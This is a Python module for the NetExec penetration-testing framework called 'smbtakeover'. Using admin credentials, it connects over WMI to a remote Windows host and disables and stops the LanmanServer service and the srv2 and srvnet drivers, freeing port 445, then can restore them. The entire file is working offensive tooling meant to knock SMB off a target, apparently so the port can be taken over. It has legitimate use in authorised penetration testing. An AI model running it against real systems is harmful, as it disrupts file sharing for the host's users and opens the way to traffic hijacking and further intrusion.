import contextlib
from sys import exit

from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY

from nxc.helpers.misc import CATEGORY


class NXCModule:
    name = "smbtakeover"
    description = "Unbinds/Rebinds port 445/tcp via SCM interactions strictly over WMI (ncacn_ip_tcp)"
    supported_protocols = ["smb", "wmi"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.action = None

    def options(self, context, module_options):
        """
        ACTION          Unbind/Rebind port 445/tcp (choices: check, stop, start)
                        - check: Enumerates service states (default)
                        - stop: Unbinds 445/tcp (Stops LanmanServer, srv2, srvnet)
                        - start: Rebinds 445/tcp (Restores services)
        """
        if "ACTION" not in module_options:
            self.action = "check"
        else:
            self.action = module_options["ACTION"].lower()

        if self.action not in ["check", "stop", "start"]:
            context.log.fail("Invalid ACTION. Supported choices are: check, stop, start")
            exit(1)

    def on_admin_login(self, context, connection):
        context.log.display(f"Executing smbtakeover {self.action} via WMI (ncacn_ip_tcp)...")
        smbtakeover_wmi = SmbTakeoverWmi(context, connection)

        if smbtakeover_wmi.is_initialized:
            try:
                if self.action == "check":
                    smbtakeover_wmi.check()
                elif self.action == "stop":
                    smbtakeover_wmi.stop()
                elif self.action == "start":
                    smbtakeover_wmi.start()
            except Exception as e:
                context.log.fail(f"Execution error: {e!s}")

            if context.protocol != "wmi":
                smbtakeover_wmi.disconnect()


class SmbTakeoverWmi:
    """Handles SCM interactions indirectly over WMI (ncacn_ip_tcp)"""

    def __init__(self, context, connection):
        self.logger = context.log

        self.__is_initialized = False

        try:
            self.__dcom = DCOMConnection(
                target=connection.host,
                username=connection.username,
                password=connection.password,
                domain=connection.domain,
                lmhash=connection.lmhash,
                nthash=connection.nthash,
                aesKey=connection.aesKey,
                oxidResolver=True,
                doKerberos=connection.kerberos,
                kdcHost=connection.kdcHost,
                remoteHost=connection.host,
            )

            i_interface = self.__dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            self.__iWbemLevel1Login = wmi.IWbemLevel1Login(i_interface)
            self.__is_initialized = True
        except Exception as e:
            self.logger.fail(f"WMI connection failed: {e!s}")
            self.disconnect()

    @property
    def is_initialized(self):
        return self.__is_initialized

    def disconnect(self):
        with contextlib.suppress(Exception):
            if hasattr(self, f"_{self.__class__.__name__}__dcom"):
                self.__dcom.disconnect()

    def connect_cimv2(self):
        i_wbem_services = self.__iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
        i_wbem_services.get_dce_rpc().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        return i_wbem_services

    def get_service_or_driver(self, i_wbem_services, name):
        if name in ["srv2", "srvnet"]:
            table = "Win32_SystemDriver"
        elif name == "LanmanServer":
            table = "Win32_Service"
        else:
            self.logger.fail(f"Unknown service or driver name: {name}")
            return None

        try:
            query = f"SELECT * FROM {table} WHERE Name='{name}'"
            objects = i_wbem_services.ExecQuery(query).Next(0xFFFFFFFF, 1)
            if objects and len(objects) > 0:
                return objects[0]
        except Exception as e:
            if "code: 0x1 - WBEM_S_FALSE" in str(e):
                self.logger.debug(f"Object '{name}' not found in {table} (WBEM_S_FALSE)")
            else:
                self.logger.fail(f"Unexpected WMI error checking {table}: {e!s}")
        return None

    def call_wmi_method(self, obj, method_name, *args):
        try:
            out = getattr(obj, method_name)(*args)
            if isinstance(out, int):
                return out
            if out is None:
                return None
            props = dict(out.getProperties())
            return props.get("ReturnValue", {}).get("value", None)
        except Exception as e:
            self.logger.fail(f"Error executing {method_name}: {e!s}")
            return None

    def change_start_mode(self, service_obj, mode, service_name):
        ret = self.call_wmi_method(service_obj, "ChangeStartMode", mode)
        if ret == 0:
            self.logger.success(f"[{service_name}] StartMode changed to {mode}")
        else:
            self.logger.fail(f"[{service_name}] Failed to set StartMode to {mode} (Ret: {ret})")

    def stop_service(self, service_obj, service_name):
        ret = self.call_wmi_method(service_obj, "StopService")
        if ret == 0:
            self.logger.success(f"[{service_name}] Stopped successfully")
        elif ret == 5:
            self.logger.info(f"[{service_name}] Already stopped")
        else:
            self.logger.fail(f"[{service_name}] Failed to stop (Ret: {ret})")

    def start_service(self, service_obj, service_name):
        ret = self.call_wmi_method(service_obj, "StartService")
        if ret == 0:
            self.logger.success(f"[{service_name}] Started successfully")
        elif ret == 10:
            self.logger.info(f"[{service_name}] Already running")
        else:
            self.logger.fail(f"[{service_name}] Failed to start (Ret: {ret})")

    def check_service(self, i_wbem_services, service_name):
        svc_obj = self.get_service_or_driver(i_wbem_services, service_name)
        if svc_obj:
            props = dict(svc_obj.getProperties())
            state = props.get("State", {}).get("value", "Unknown")
            start_mode = props.get("StartMode", {}).get("value", "Unknown")
            return svc_obj, state, start_mode
        else:
            self.logger.fail(f"[{service_name}] Service/Driver not found!")
        return None

    def check(self):
        i_wbem_services = self.connect_cimv2()
        services_to_check = ["LanmanServer", "srv2", "srvnet"]
        for service_name in services_to_check:
            _, state, start_mode = self.check_service(i_wbem_services, service_name)
            self.logger.highlight(f"[{service_name}] State: {state} | StartMode: {start_mode}")
        self.__iWbemLevel1Login.RemRelease()

    def stop(self):
        i_wbem_services = self.connect_cimv2()

        lanmanserver, lanmanserver_state, lanmanserver_start_mode = self.check_service(i_wbem_services, "LanmanServer")
        if lanmanserver:
            if lanmanserver_start_mode != "Disabled":
                self.change_start_mode(lanmanserver, "Disabled", "LanmanServer")

            if lanmanserver_state != "Stopped":
                self.stop_service(lanmanserver, "LanmanServer")

        srv2, srv2_state, _ = self.check_service(i_wbem_services, "srv2")
        if srv2 and srv2_state != "Stopped":
            self.stop_service(srv2, "srv2")

        srvnet, srvnet_state, _ = self.check_service(i_wbem_services, "srvnet")
        if srvnet and srvnet_state != "Stopped":
            self.stop_service(srvnet, "srvnet")

        self.check()

        self.logger.success("SMB unbind sequence completed via WMI. Port 445 is free.")
        self.__iWbemLevel1Login.RemRelease()

    def start(self):
        i_wbem_services = self.connect_cimv2()

        srvnet, srvnet_state, _ = self.check_service(i_wbem_services, "srvnet")
        if srvnet and srvnet_state != "Running":
            self.start_service(srvnet, "srvnet")

        srv2, srv2_state, _ = self.check_service(i_wbem_services, "srv2")
        if srv2 and srv2_state != "Running":
            self.start_service(srv2, "srv2")

        lanmanserver, lanmanserver_state, lanmanserver_start_mode = self.check_service(i_wbem_services, "LanmanServer")
        if lanmanserver:
            if lanmanserver_start_mode != "Auto":
                self.change_start_mode(lanmanserver, "Automatic", "LanmanServer")

            if lanmanserver_state != "Running":
                self.start_service(lanmanserver, "LanmanServer")

        self.check()

        self.logger.success("SMB rebind sequence completed via WMI. Port 445 restored.")
        self.__iWbemLevel1Login.RemRelease()
